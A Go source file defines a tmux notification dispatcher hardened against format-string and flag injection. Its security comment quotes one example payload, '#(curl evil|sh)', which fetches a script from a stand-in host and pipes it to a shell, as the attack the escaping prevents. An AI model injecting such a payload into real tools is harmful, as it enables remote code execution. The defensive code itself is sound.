package notify

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
)

// TmuxDispatcher sends notifications via tmux display-message.
type TmuxDispatcher struct {
	// Target is the tmux target session/window (optional).
	// If empty, sends to the current session.
	Target string
}

// NewTmuxDispatcher creates a dispatcher that shows notifications in tmux.
func NewTmuxDispatcher(target string) *TmuxDispatcher {
	return &TmuxDispatcher{Target: target}
}

// Name returns the dispatcher name "tmux".
func (d *TmuxDispatcher) Name() string { return "tmux" }

// Dispatch shows the notification via `tmux display-message`.
//
// Security: tmux interprets its `message` argument as a FORMAT STRING by
// default, and format expansion includes `#(shell-command)` which tmux
// itself runs via /bin/sh. A notification title or body that arrives from
// an attacker-influenced producer (plugin stdout, MCP tool output, workflow
// YAML field) could embed `#(curl evil|sh)` and trigger RCE on the
// reviewer's box. We close this two ways: pass `-l` so the argument is
// treated as a literal string, AND escape `#` → `##` (tmux's documented
// literal-`#` escape) as belt-and-braces in case a future call path drops
// the flag. The previous single-quote shell-escape was cargo-culted — argv
// isn't passed through a shell — so it's gone.
func (d *TmuxDispatcher) Dispatch(ctx context.Context, n *Notification) error {
	msg := n.Title
	if n.Body != "" {
		msg = n.Title + ": " + n.Body
	}
	// Truncate long messages for tmux display.
	if len(msg) > 200 {
		msg = msg[:197] + "..."
	}
	msg = strings.ReplaceAll(msg, "#", "##")

	args := []string{"display-message", "-l"}
	if d.Target != "" {
		// Defense against flag-injection via a `--`-leading Target: tmux
		// would interpret a Target like `-Vfoo` as a global flag.
		if strings.HasPrefix(d.Target, "-") {
			return fmt.Errorf("tmux display-message: invalid target %q", d.Target)
		}
		args = append(args, "-t", d.Target)
	}
	args = append(args, msg)

	cmd := exec.CommandContext(ctx, "tmux", args...)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("tmux display-message: %w: %s", err, out)
	}
	return nil
}

// Close is a no-op for TmuxDispatcher.
func (d *TmuxDispatcher) Close() error { return nil }
